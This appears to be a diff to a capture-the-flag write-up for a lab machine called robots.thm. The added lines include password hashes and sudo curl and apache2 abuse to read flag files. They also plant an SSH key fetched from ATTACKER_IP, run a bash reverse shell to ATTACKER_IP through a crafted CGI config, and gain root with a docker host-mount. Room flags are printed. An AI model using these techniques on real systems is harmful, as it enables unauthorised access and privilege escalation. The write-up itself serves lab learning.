@@ -7,6 +7,7 @@
 
 ## 🎯 Objectives
 
+- Get User & Root flag
 - Identify vulnerable services and paths
 - Exploit XSS for session hijacking
 - Gain remote shell access
@@ -110,6 +111,8 @@ exfil();
 - Discovered database credentials in PHP source code.
 - Used **chisel** for port forwarding to MySQL.
 - Extracted users table containing admin and rgiskard credentials.
+- rgiskard : dfb35334bf2a1338fa40e5fbb4ae4753
+- admin : 3e3d6c2d540d49b1a11cf74ac5a37233
 
 SSH logged in as `rgiskard`.
 
@@ -125,7 +128,7 @@ User rgiskard may run the following commands:
 ```
 
 Used curl to:
-- Read `/home/dolivaw/user.txt` for **User Flag**:
+- Execute `sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///home/dolivaw/user.txt` for **User Flag**:
 ```
 THM{9b17d3c3e86c944c868c57b5a7fa07d8}
 ```
@@ -134,6 +137,7 @@ THM{9b17d3c3e86c944c868c57b5a7fa07d8}
 
 ## 🧠 SSH Pivot to `dolivaw`
 
+Generate key using `ssh-keygen -f id_ed25519 -t ed25519`.
 Uploaded SSH key by:
 ```bash
 sudo -u dolivaw /usr/bin/curl 127.0.0.1/ATTACKER_IP/id_ed25519.pub -o /home/dolivaw/.ssh/authorized_keys
@@ -146,7 +150,7 @@ ssh -i id_ed25519 dolivaw@robots.thm
 
 ---
 
-## 🏁 Privilege Escalation - Root
+## Get Root flag
 
 Checked `sudo -l`:
 
@@ -156,7 +160,7 @@ User dolivaw may run: /usr/sbin/apache2
 
 Used GTFOBins trick:
 
-Fixed APACHE_RUN_DIR error by:
+To read the root flag:
 ```bash
 sudo /usr/sbin/apache2 -C 'Define APACHE_RUN_DIR /tmp' -C 'Include /root/root.txt' -k stop
 ```
@@ -165,7 +169,42 @@ Extracted **Root Flag**:
 ```
 THM{2a279561f5eea907f7617df3982cee24}
 ```
+🏁 Privilege Escalation - Root
 
+Create an cgi.conf:
+```
+LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
+LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
+LoadModule mime_module /usr/lib/apache2/modules/mod_mime.so
+LoadModule cgi_module /usr/lib/apache2/modules/mod_cgi.so
+LoadModule alias_module /usr/lib/apache2/modules/mod_alias.so
+
+User www-data
+Group docker
+
+ServerName localhost
+Listen 8080
+
+TypesConfig /etc/mime.types
+
+ScriptAlias /rev /tmp/rev.sh
+
+ErrorLog "/tmp/error.log"
+```
+and revershell bash
+```
+/bin/bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+```
+Start a listener on port 443.
+
+ - Start apache2 `sudo /usr/sbin/apache2 -f /tmp/cgi.conf -k start`.
+ - Give permission to rev.sh `chmod 777 /tmp/rev.sh`.
+ - to get reverse shell `curl http://127.0.0.1:8080/rev`.
+ - We can see that there's docker running using `id` command.
+
+Shell as root:
+ - To list images `docker image ls`.
+ - To get root `docker run -v /:/mnt --rm -it mariadb sh`.
 ---
 
 ## 📚 What I Learned
